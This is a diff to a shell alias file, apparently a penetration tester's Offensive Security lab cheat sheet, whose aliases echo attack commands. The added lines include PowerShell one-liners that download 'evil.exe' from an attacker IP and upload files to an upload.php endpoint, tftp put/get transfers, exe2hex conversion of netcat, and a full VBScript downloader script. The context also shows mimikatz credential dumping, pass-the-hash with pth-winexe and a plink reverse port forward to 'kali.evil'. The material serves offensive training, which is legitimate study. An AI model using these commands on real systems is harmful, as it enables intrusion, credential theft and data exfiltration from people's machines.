@@ -393,7 +393,8 @@ alias impacket-launchsmbserver='python smbserver.py NOPEROPE /offsec/stage'
 #todo: my-ftp/http/staging-area
 
 # attacking resources
-alias service-run-smb='impacket-launchsmbserver'
+alias serve-smb='impacket-launchsmbserver'
+alias serve-tftp='atftpd --daemon --port 69 /tftp'
 
 # offsec commands
 alias ostage="cp -t $OFFSTAGE -R "
@@ -406,6 +407,11 @@ echo , => Upper
 echo @ => lower
 echo ^ => Special
 echo % => Numeric
+'
+alias usage-exe2hex='
+echo upx -9 file.exe
+echo exe2hex -x file.exe -b nc.cmd
+echo exe2hex -x file.exe -p nc.ps1
 '
 alias usage-mimikatz-logonpasswords='
 echo log C:\\Windows\\Temp\\mimi-creds.log
@@ -430,13 +436,11 @@ alias usage-pth-winexe='
 echo pth-winexe -U DOM/USER%aad3b435b51404eeaad3b435b51404ee:NTLM_HASH //TARGET cmd
 echo pth-winexe -U DOM/USER%LM_HASH:NTLM_HASH //TARGET cmd
 '
-
 alias usage-ssh-local-portfwde='
 echo "ssh -N -L <bind_addr>:<bind_port>:<target_addr>:<target_port> username@sshproxy.com"
 echo "ssh -N -L kali:445:dc1:445 kali@bounce"
 echo "-- kali:445 ---> 22:bounce:Ephermal --> 445:dc1"
 '
-
 alias usage-ssh-remote-portfwd='
 echo "ssh -N -R <bind_addr>:<bind_port>:<target_addr>:<target_port> username@sshproxy.com"
 echo "ssh -N -R kali:4444:127.0.0.1:3306 kali@kali"
@@ -449,7 +453,12 @@ echo "cmd.exe /c echo y | plink.exe -ssh -l <user> -pw <pass> -R <bind_addr>:<bi
 echo "cmd.exe /c echo y | plink.exe -ssh -l offsec -pw offsec -R kali.evil:1337:127.0.0.1:3306 kali.evil"
 echo "-- localhost:3306 <-- 1337:kali"
 '
-
+alias usage-ps-downloadfile='
+echo "powershell.exe (New-Object System.Net.WebClient).DownloadFile(\"http://10.11.0.4/evil.exe\", \"new-exploit.exe\")"
+'
+alias usage-ps-uploadfile='
+echo "powershell.exe (New-Object System.Net.WebClient).UploadFile(\"http://10.0.0.90/upload.php\", \"template.mtxcfg\")"
+'
 alias usage-netsh-forward='
 echo # 1. Create proxy
 echo "netsh interface portproxy add v4tov4 listenport=<local_port> listenaddress=<local_addr> connectport=<remote_port> connectaddress=<remote_addr>"
@@ -461,7 +470,12 @@ echo "netsh advfirewall firewall add rule name=\"forward_port_rule\" protocol=TC
 echo 
 echo "-- kali:445 --> 4455:10.11.0.22:: --> 445:192.168.1.110"
 '
-
+alias usage-wintftp-get='
+echo tftp -i 10.11.0.4 get source.file destination.file
+'
+alias usage-wintftp-put='
+echo tftp -i 10.11.0.4 put source.file
+'
 alias usage-winftp='
 echo "echo open 10.11.0.4 21 > ftp.txt"
 echo "echo USER offsec>> ftp.txt"
@@ -471,12 +485,40 @@ echo "echo GET nc.exe >> ftp.txt"
 echo "echo bye >> ftp.txt"
 echo "ftp -v -n -s:ftp.txt"
 '
-
+alias usage-wget-vbs='
+echo "echo strUrl = WScript.Arguments.Item(0) > wget.vbs"
+echo "echo StrFile = WScript.Arguments.Item(1) >> wget.vbs"
+echo "echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs"
+echo "echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs"
+echo "echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs"
+echo "echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs"
+echo "echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs"
+echo "echo Err.Clear >> wget.vbs"
+echo "echo Set http = Nothing >> wget.vbs"
+echo "echo Set http = CreateObject(\"WinHttp.WinHttpRequest.5.1\") >> wget.vbs"
+echo "echo If http Is Nothing Then Set http = CreateObject(\"WinHttp.WinHttpRequest\") >> wget.vbs"
+echo "echo If http Is Nothing Then Set http = CreateObject(\"MSXML2.ServerXMLHTTP\") >> wget.vbs"
+echo "echo If http Is Nothing Then Set http = CreateObject(\"Microsoft.XMLHTTP\") >> wget.vbs"
+echo "echo http.Open \"GET\", strURL, False >> wget.vbs"
+echo "echo http.Send >> wget.vbs"
+echo "echo varByteArray = http.ResponseBody >> wget.vbs"
+echo "echo Set http = Nothing >> wget.vbs"
+echo "echo Set fs = CreateObject(\"Scripting.FileSystemObject\") >> wget.vbs"
+echo "echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs"
+echo "echo strData = \"\" >> wget.vbs"
+echo "echo strBuffer = \"\" >> wget.vbs"
+echo "echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs"
+echo "echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs"
+echo "echo Next >> wget.vbs"
+echo "echo ts.Close >> wget.vbs"
+'
+alias usage-win-vbs='
+echo cscript wget.vbs http://10.11.0.4/evil.exe evil.exe
+'
 
 ### logstash ###
 ### zeek ###
 ### zfs ###
-
 
 ### Conditional Aliases ###
 if command -v lsb_release &> /dev/null
